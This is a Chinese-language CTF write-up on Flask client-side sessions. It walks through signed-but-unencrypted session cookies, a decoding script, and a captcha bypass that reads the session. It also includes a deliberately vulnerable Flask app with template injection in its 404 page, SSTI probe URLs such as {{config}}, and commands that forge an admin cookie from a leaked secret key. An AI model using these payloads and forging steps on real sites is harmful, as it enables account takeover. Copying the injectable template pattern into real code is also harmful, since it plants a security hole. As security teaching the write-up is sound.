---
title: Lab - CTF 2019-Hgame-Web-Week4
date: 2019-12-13 11:11:11 -0400
categories: [Lab, CTF]
tags: [Lab, CTF]
---

[toc]

---

# CTF：2019-Hgame-Web-Week4

```bash
注入{{config}}得到secret_key
- 抓取session利用GitHub的session_cookie_manager.py解密session，
- 发现user_id是个数字，把它改成 admin 加密后访问失败。
- 注册两个新账号whd1/whd2发现其 user_id 为 164/165
- 猜测admin的user_id为01.
- 成功得到flag
```

---

## 背景知识

在Web中，session是认证用户身份的凭证，它具备如下几个特点：
- 用户不可以任意篡改
- A用户的session无法被B用户获取
- session的设计目的是为了做用户身份认证。
但是，很多情况下，session被用作了别的用途，将产生一些安全问题，such as “客户端session”（client session）导致的安全问题。


**服务端session**
- 对于web开发环境，大部分都是将`session`写入服务器本地一个文件, 然后在`cookie`里设置一个`sessionId` 的字段来区分不同用户（常常是`'/tmp/sess_'+sessionID`）
  - 在传统PHP开发中，`$_SESSION`变量的内容默认会被保存在服务端的一个文件中，通过一个叫“`PHPSESSID`”的`Cookie`来区分用户。
- 这类session是“服务端session”，
- 用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。
- `session`保存在服务端，



**客户端session**
- `cookie`保存在客户端: 客户端session
- 有些语言本身并不带有良好的session存储机制, 采用其它的方法去对session进行处理
- 比如Django默认将session存在数据库里(刚知道=。=)，
- 而轻量的flask对数据库操作的框架也没有，选择了将session整个的存到cookie里(加密后)，所以叫做客户端session。

> 将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。


**flask对session的处理**

```py
# sessions.py:
class SecureCookieSessionInterface(SessionInterface):
    # The default session interface that stores sessions in signed cookies through the :mod:`itsdangerous` module.
    # the salt that should be applied on top of the secret key for the signing of cookie based sessions.
    salt = 'cookie-session'
    # the hash function to use for the signature.
    # The default is sha1
    digest_method = staticmethod(hashlib.sha1)
    # the name of the itsdangerous supported key derivation.
    # The default is hmac.
    key_derivation = 'hmac'
    # A python serializer for the payload.
    # The default is a compact JSON derived serializer with support for some extra Python types such as datetime objects or tuples.
    serializer = session_json_serializer
    session_class = SecureCookieSession

    def get_signing_serializer(self, app):
        if not app.secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                    serializer=self.serializer,
                                    signer_kwargs=signer_kwargs)


    # open和save分别对应着session的读取和写入
    # 会打开一个URLSafeTimedSerializer对象，调取它的loads或是dumps方法
    # URLSafeTimedSerializer继承了URLSafeSerializerMixin和TimedSerializer，包含了一些序列化处理。
    def open_session(self, app, request):
        s = self.get_signing_serializer(app)
        if s is None:
            return None
        val = request.cookies.get(app.session_cookie_name)
        if not val:
            return self.session_class()
        max_age = total_seconds(app.permanent_session_lifetime)
        try:
            data = s.loads(val, max_age=max_age)
            return self.session_class(data)
        except BadSignature:
            return self.session_class()

    def save_session(self, app, session, response):
        domain = self.get_cookie_domain(app)
        path = self.get_cookie_path(app)

        # If the session is modified to be empty, remove the cookie.
        # If the session is empty, return without setting the cookie.
        if not session:
            if session.modified:
                response.delete_cookie(
                    app.session_cookie_name,
                    domain=domain,
                    path=path
                )
            return

        # Add a "Vary: Cookie" header if the session was accessed at all.
        if session.accessed:
            response.vary.add('Cookie')

        if not self.should_set_cookie(app, session):
            return

        httponly = self.get_cookie_httponly(app)
        secure = self.get_cookie_secure(app)
        samesite = self.get_cookie_samesite(app)
        expires = self.get_expiration_time(app, session)
        # 将类型为字典的session对象序列化成字符串
        val = self.get_signing_serializer(app).dumps(dict(session))
        # 将最后的内容保存在cookie中
        response.set_cookie(
            app.session_cookie_name,
            val,
            expires=expires,
            httponly=httponly,
            domain=domain,
            path=path,
            secure=secure,
            samesite=samesite
        )
```

在默认情况下，除了`app.secret_key`的值是未知的，其它的参数都是固定好的
- 如果项目使用了session机制，`secret_key`字段是被强制要求设定的，可以通过在配置文件里写入固定字符串或启动时随机生成来获得
- 假如攻击者通过任意文件读取或其它手段拿到了项目的`secret_key`，那么完全有可能 <font color=red> 解密和伪造cookie </font> 来控制用户身份

```py
# 例如如下代码：
from itsdangerous import *
import hashlib
from flask.json.tag import TaggedJSONSerializer
secret_key='f9cb5b2f-b670-4584-aad4-3e0603e011fe'
salt='cookie-session'
serializer=TaggedJSONSerializer()
signer_kwargs=dict(key_derivation='hmac',digest_method=hashlib.sha1)
sign_cookie='eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.XAquJg.AUEZAdrYhYCk3pg4iYy_NIpfpD0'

val = URLSafeTimedSerializer(secret_key, salt=salt,
                                      serializer=serializer,
                                      signer_kwargs=signer_kwargs)
data= val.loads(sign_cookie)
print data
#{u'username': u'test'}

crypt= val.dumps({'username': 'admin'})
print crypt
```




**URLSafeTimedSerializer类**

```py
class Signer(object):
    # ...
    def sign(self, value):
        """Signs the given string."""
        return value + want_bytes(self.sep) + self.get_signature(value)

    def get_signature(self, value):
        """Returns the signature for the given value"""
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)


class Serializer(object):
    default_serializer = json
    default_signer = Signer
    # ....
    def dumps(self, obj, salt=None):
        """Returns a signed string serialized with the internal serializer.
        The return value can be either a byte or unicode string depending
        on the format of the internal serializer.
        """
        payload = want_bytes(self.dump_payload(obj))
        rv = self.make_signer(salt).sign(payload)
        if self.is_text_serializer:
            rv = rv.decode('utf-8')
        return rv

    def dump_payload(self, obj):
        """Dumps the encoded object. The return value is always a
        bytestring. If the internal serializer is text based the value
        will automatically be encoded to utf-8.
        """
        return want_bytes(self.serializer.dumps(obj))


class URLSafeSerializerMixin(object):
    """Mixed in with a regular serializer it will attempt to zlib compress
    the string to make it shorter if necessary. It will also base64 encode
    the string so that it can safely be placed in a URL.
    """
    def load_payload(self, payload):
        decompress = False
        if payload.startswith(b'.'):
            payload = payload[1:]
            decompress = True
        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload('Could not base64 decode the payload because of '
                'an exception', original_error=e)
        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload('Could not zlib decompress the payload before '
                    'decoding the payload', original_error=e)
        return super(URLSafeSerializerMixin, self).load_payload(json)

    # 序列化session的主要过程
    def dump_payload(self, obj):
        # json.dumps 将对象转换成json字符串，作为数据
        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
        is_compressed = False
        # 如果数据压缩后长度更短，则用zlib库进行压缩
        compressed = zlib.compress(json)
        if len(compressed) < (len(json) - 1):
            json = compressed
            is_compressed = True
        # 将数据用base64编码
        base64d = base64_encode(json)
        if is_compressed:
            # 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割
            base64d = b'.' + base64d
            # 解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。
            # flask仅仅对数据进行了签名。
            # 签名的作用是防篡改，而无法防止被读取。
            # 而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，可能造成一些安全问题。
        return base64d


class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
    """Works like :class:`TimedSerializer` but dumps and loads into a URL
    safe string consisting of the upper and lowercase character of the
    alphabet as well as ``'_'``, ``'-'`` and ``'.'``.
    """
    default_serializer = compact_json
```

最后，我们在cookie中就能看到设置好的session了：

![18db98ef-c8ec-435e-a21a-f8eaa8c97631.95a9fc66c7c4](https://i.imgur.com/rxZaB6T.png)


---

## flask客户端session导致敏感信息泄露


flask是一个客户端session，所以看目标为flask的站点的时候，解密其session。

解密session：
```py
# decryption.py
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

解密演示的session：

```bash
$ python decryption.py "eyJ1c2VybmFtZSI6ImhlaGUifQ.XApTkw.zcIUPrpo71h_doQs_GKtDlLesP8"
{'admin':True}
```

通过解密目标站点的session，发现其设置了一个名为token、值是一串md5的键。
- 猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。
- 通过这个过程就能修改任意用户密码了。

这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。

但因为flask的session是存储在cookie中且仅签名而未加密，所以就可以直接读取这个token了。


---

## 0x04 flask验证码绕过漏洞
这是客户端session的另一个常见漏洞场景。

[code](https://github.com/shonenada/flask-captcha),
- 这是一个为flask提供验证码的项目
- 其中的view文件：

```py
import random
try:
    from cStringIO import StringIO
except ImportError:
    from io import BytesIO as StringIO

from flask import Blueprint, make_response, current_app, session
from wheezy.captcha.image import captcha
from wheezy.captcha.image import background
from wheezy.captcha.image import curve
from wheezy.captcha.image import noise
from wheezy.captcha.image import smooth
from wheezy.captcha.image import text
from wheezy.captcha.image import offset
from wheezy.captcha.image import rotate
from wheezy.captcha.image import warp

captcha_bp = Blueprint('captcha', __name__)

def sample_chars():
    characters = current_app.config['CAPTCHA_CHARACTERS']
    char_length = current_app.config['CAPTCHA_CHARS_LENGTH']
    captcha_code = random.sample(characters, char_length)
    return captcha_code

@captcha_bp.route('/captcha', endpoint="captcha")
def captcha_view():
    out = StringIO()
    captcha_image = captcha(drawings=[
        background(),
        text(fonts=current_app.config['CAPTCHA_FONTS'],
             drawings=[warp(), rotate(), offset()]),
        curve(),
        noise(),
        smooth(),
    ])
    captcha_code = ''.join(sample_chars())
    imgfile = captcha_image(captcha_code)
    # 其生成验证码后，就存储在session中了
    session['captcha'] = captcha_code
    imgfile.save(out, 'PNG')
    out.seek(0)
    response = make_response(out.read())
    response.content_type = 'image/png'
    return response
```

可见，其生成验证码后，就存储在session中了：`session['captcha'] = captcha_code`

用浏览器访问`/captcha`，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：

```bash
$ python decryption.py "eyJ1c2VybmFtZSI6ImhlaGUifQ.XApTkw.zcIUPrpo71h_doQs_GKtDlLesP8"
{'admin':True, 'captcha':'Me4dk'}
```

![668894a6-6f59-425b-b032-cba1370c39e9.d200fedb421d](https://i.imgur.com/CugZEps.png)

成功获取了验证码的值，进而可以绕过验证码的判断。

这也是客户端session的一种错误使用方法。



---

## flask的身份伪造复现

测试用的代码比较简单。

```py
# main.py：
# coding:utf8
import uuid
from flask import Flask, request, make_response, session,render_template, url_for, redirect, render_template_string

app = Flask(__name__)
app.config['SECRET_KEY']=str(uuid.uuid4())

@app.route('/')
def index():
    app.logger.info(request.cookies)
    try:
        username=session['username']
        return render_template("index.html",username=username)
    except Exception,e:

        return """<form action="%s" method='post'>
                    <input type="text" name="username" required>
                    <input type="password" name="password" required>
                    <input type="submit" value="登录">
                  </form>""" %url_for("login")


@app.route("/login/", methods=['POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    app.logger.info(username)
    if username.strip():
        if username=="admin" and password!=str(uuid.uuid4()):
            return "login failed"
        app.logger.info(url_for('index'))
        resp = make_response(redirect(url_for("index")))
        session['username']=username
        return resp
    else:
        return "login failed"


@app.errorhandler(404)
def page_not_found(e):
    # template='''
    #             {%% block body %%}
    #             <div class="center-content error">
    #             <h1>Oops! That page doesn't exist.</h1>
    #             <h3>%s</h3>
    #             </div>
    #             {%% endblock %%}
    #         '''%(request.url)
    return render_template_string(template),404

@app.route("/logout")
def logout():
    resp = make_response(redirect(url_for("index")))
    session.pop('username')
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9999, debug=True)
```

templates/index.html:

```html
<!DOCTYPE html>
<html>
    <body>
        username: {{ username }}, <a href="{{ url_for('logout') }}"> logout </a>
    </body>
</html>
```

主要实现了一个session实现的登录操作，并特意留下了一个404页面的ssti（关于flask的ctf比赛中常常会出现，据说开发人员经常会贪图省事，不去单独创建模板文件而使用这样的模板字符串），可能还有其它bug。

登录会显示用户名，正常情况下，admin用户是无法登录的。

![1209628-20181207203705974-2070684584](https://i.imgur.com/LlDvRrX.png)


利用404页面的ssti读取内置变量，还有其它一些常用方法可以参考：https://blog.csdn.net/qq_33020901/article/details/83036927

```bash
# 输出hello 2，确定是模板注入
http://118.25.18.223:3001/{{1+1}}

http://118.25.18.223:3001/{{config}}

http://118.25.18.223:3001/{{''.__class__.__mro__}}
# 发现可以，觉得大概是沙箱逃逸了
```


![attack](https://i.imgur.com/UzdZoNo.png)

![20190223211856417](https://i.imgur.com/w0r5P8s.png)


## 伪造session登陆

注入`{{config}}`得到了`secret_key`，
- 抓取session利用GitHub的`session_cookie_manager.py`解密`session`，
- 发现user_id是个数字，把它改成 admin 加密后访问失败。
- 注册两个新账号whd1/whd2发现其 user_id 为 164/165
- 猜测admin的user_id为01.
- 成功得到flag


**cookie**:

```bash
# 我之前登录的cookie是：
Cookie: session=eyJ1c2VybmFtZSI6ImhlaGUifQ.XApTkw.zcIUPrpo71h_doQs_GKtDlLesP8

# 使用session_cookie_manager.py解开得到用户信息。
# $ python session_cookie_manager.py decode -s "secret_key" -c "Cookie: session"
$ python session_cookie_manager.py decode -s "a8bc2e85-d628-40f0-a56d-a86b19b4c1f9" -c "eyJ1c2VybmFtZSI6ImhlaG UifQ.XApTkw.zcIUPrpo71h_doQs_GKtDlLesP8"
# {u'username': u'hehe'}
# {u'csrf_token':u'xxxxxxxx', u'_fresh':True, u'user_id':u'28', u'_id':u'xxxxxxxx'}

# 伪造admin用户身份：
$ python session_cookie_manager.py encode -s "a8bc2e85-d628-40f0-a56d-a86b19b4c1f9" -t "{u'username': u'admin' }"
eyJ1c2VybmFtZSI6ImFkbWluIn0.XArr2w.O2zQzR4fFLCrGhDLjWol8-mLp7E
```

提交生成的cookie：用admin身份成功登录。

![1209628-20181207205516587-1118649062](https://i.imgur.com/xPNkJ0T.png)


![20190223211926119](https://i.imgur.com/yn48wFR.png)



---


ref:
- [客户端 session 导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html)
